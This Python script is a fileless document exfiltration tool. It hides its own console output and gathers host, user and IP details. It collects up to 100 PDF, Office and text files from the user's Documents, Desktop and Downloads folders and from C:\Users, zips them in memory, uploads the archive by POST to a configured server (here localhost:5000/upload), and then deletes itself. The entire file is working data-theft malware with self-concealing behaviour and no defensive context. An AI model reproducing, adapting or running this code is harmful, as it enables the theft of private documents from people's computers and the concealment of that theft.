import os
import sys
import platform
import urllib.request
import urllib.parse
import time
import uuid
import io
import zipfile
from pathlib import Path
from contextlib import redirect_stdout

EXFIL_URL = "http://localhost:5000/upload"      # server url where .zip will be uploaded
DOCUMENT_EXTENSIONS = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf', '.odt', '.ods', 'odp']
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB per file
MAX_FILES = 100  # max files to exfil
CHUNK_SIZE = 50 * 1024 * 1024

_log_buffer = io.StringIO()
_original_stdout = sys.stdout
_original_stderr = sys.stderr
sys.stdout = _log_buffer
sys.stderr = _log_buffer

def get_system_info():
    print(f"[*] Gathering system information...")
    info = {
        'hostname': platform.node(),
        'platform': platform.platform(),
        'user': os.getenv('USER') or os.getenv('USERNAME'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'session_id': str(uuid.uuid4())[:8],
        'ip_address': get_local_ip(),
        'python_version': sys.version,
        'working_dir': os.getcwd()
    }
    print(f"[+] System info gathered for {info['hostname']} ({info['user']})")
    return info

def get_local_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def find_documents():
    print(f"[*] Searching for documents with extensions: {', '.join(DOCUMENT_EXTENSIONS)}")
    documents = []
    
    search_paths = [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Downloads'),
        'C:\\Users'
    ]
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        try:
            for root, dirs, files in os.walk(search_path):
                dirs[:] = [d for d in dirs if not d.startswith('.') and 
                          d not in ['System Volume Information', '\$RECYCLE.BIN', 
                                   'Library', 'AppData', 'ProgramData', 'Windows']]
                
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if any(file.lower().endswith(ext) for ext in DOCUMENT_EXTENSIONS):
                            file_size = os.path.getsize(file_path)
                            if file_size <= MAX_FILE_SIZE:
                                documents.append(file_path)
                                if len(documents) >= MAX_FILES:
                                    print(f"[!] Reached max file limit of {MAX_FILES}.")
                                    return documents
                    except (OSError, PermissionError):
                        continue
        except (OSError, PermissionError):
            continue
    
    print(f"[+] Document search complete. Found {len(documents)} files.")
    return documents


def create_in_memory_archive(files, system_info, log_content):
    print("[*] Creating in-memory archive...")
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED, compresslevel=6) as zipf:
        info_content = f"""========================================
SYSTEM INFORMATION REPORT
========================================
Hostname: {system_info['hostname']}
Platform: {system_info['platform']}
User: {system_info['user']}
Timestamp: {system_info['timestamp']}
Session ID: {system_info['session_id']}
IP Address: {system_info['ip_address']}
Python Version: {system_info['python_version']}
Working Directory: {system_info['working_dir']}


==================
COLLECTION SUMMARY
==================
Total Files Found: {len(files)}
Max File Size Limit: {MAX_FILE_SIZE / (1024*1024):.1f} MB
Chunk Size: {CHUNK_SIZE / (1024*1024):.1f} MB
Collection Method: Fileless (In-Memory)


=========
FILE LIST
=========
"""
        for i, file_path in enumerate(files, 1):
            try:
                file_size = os.path.getsize(file_path)
                info_content += f"{i}. {os.path.basename(file_path)} ({file_size} bytes)\n"
            except:
                info_content += f"{i}. {os.path.basename(file_path)} (size unknown)\n"
        
        info_content += f"\n========================================\nGenerated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n========================================\n"
        
        zipf.writestr("SYSTEM_INFO.txt", info_content)
        zipf.writestr("execution_log.txt", log_content)
        
        for file_path in files:
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                    filename = os.path.basename(file_path)
                    
                    if len(file_data) > CHUNK_SIZE:
                        print(f"[*] Splitting large file: {filename}")
                        part_num = 0
                        offset = 0
                        while offset < len(file_data):
                            chunk = file_data[offset : offset + CHUNK_SIZE]
                            chunk_filename = f"documents/chunks/{filename}.part{part_num}"
                            zipf.writestr(chunk_filename, chunk)
                            offset += CHUNK_SIZE
                            part_num += 1
                        print(f"[+] Split {filename} into {part_num} chunks.")
                    else:
                        zipf.writestr(f"documents/{filename}", file_data)

            except (OSError, PermissionError) as e:
                print(f"[!] Could not read {file_path}: {e}")
                continue
    
    zip_buffer.seek(0)
    print("[+] In-memory archive created successfully.")
    return zip_buffer

def exfiltrate_to_memory_server(zip_buffer, system_info):
    print(f"[*] Exfiltrating to server at {EXFIL_URL}...")
    try:
        filename = f"exfil_{system_info['hostname']}_{system_info['session_id']}_{int(time.time())}.zip"
        
        def encode_multipart_correctly(fields, files):
            boundary = '----WebKitFormBoundary' + ''.join(str(uuid.uuid4()).split('-'))
            body_parts = []
            for (key, value) in fields:
                body_parts.append(f'--{boundary}\r\n'.encode('utf-8'))
                body_parts.append(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode('utf-8'))
                body_parts.append(f'{value}\r\n'.encode('utf-8'))
            for (key, filename, file_type, file_data) in files:
                body_parts.append(f'--{boundary}\r\n'.encode('utf-8'))
                body_parts.append(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'.encode('utf-8'))
                body_parts.append(f'Content-Type: {file_type}\r\n\r\n'.encode('utf-8'))
                body_parts.append(file_data)
                body_parts.append(b'\r\n')
            body_parts.append(f'--{boundary}--\r\n'.encode('utf-8'))
            body = b''.join(body_parts)
            content_type = f'multipart/form-data; boundary={boundary}'
            return body, content_type

        fields = [
            ('hostname', system_info['hostname']),
            ('user', system_info['user']),
            ('session_id', system_info['session_id']),
            ('timestamp', system_info['timestamp'])
        ]
        files = [
            ('file', filename, 'application/zip', zip_buffer.getvalue())
        ]

        body, content_type = encode_multipart_correctly(fields, files)
        
        headers = {
            'Content-Type': content_type,
            'Content-Length': str(len(body))
        }

        req = urllib.request.Request(EXFIL_URL, data=body, headers=headers, method='POST')
        
        with urllib.request.urlopen(req, timeout=60) as response:
            if response.status == 200:
                response_text = response.read().decode('utf-8')
                print(f"[+] Server response: {response_text}")
                return True
            else:
                print(f"[-] Server returned status: {response.status}")
                return False
            
    except Exception as e:
        print(f"[-] Exfiltration error: {e}")
        return False

def check_server_status():
    print(f"[*] Checking server status at {EXFIL_URL}...")
    try:
        with urllib.request.urlopen(f"{EXFIL_URL.replace('/upload', '/')}", timeout=5) as response:
            if response.status == 200:
                print("[+] Server is online.")
                return True
            else:
                print(f"[-] Server returned status: {response.status}")
                return False
    except Exception as e:
        print(f"[-] Server check failed: {e}")
        return False

def main():
    try:
        if not check_server_status():
            print("[-] Fileless server not responding. Aborting.")
            return
        
        system_info = get_system_info()
        
        documents = find_documents()
        
        if not documents:
            print("[-] No documents found to exfiltrate. Aborting.")
            return
        
        total_size = 0
        for doc in documents:
            try:
                total_size += os.path.getsize(doc)
            except:
                continue
        
        print(f"[*] Estimated data size: {total_size / (1024*1024):.2f} MB")
        
        log_content = _log_buffer.getvalue()
        
        zip_buffer = create_in_memory_archive(documents, system_info, log_content)
        
        if exfiltrate_to_memory_server(zip_buffer, system_info):
            print(f"[+] Fileless exfiltration successful!")
            print(f"[*] Session ID: {system_info['session_id']}")
            print(f"[*] All output has been logged to 'execution_log.txt' inside the zip file.")
        else:
            print("[-] Exfiltration failed.")
            
    except Exception as e:
        print(f"[-] Critical error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        sys.stdout = _original_stdout
        sys.stderr = _original_stderr

if __name__ == "__main__":
    main()
    try:
        os.remove(sys.argv[0])
    except:
        pass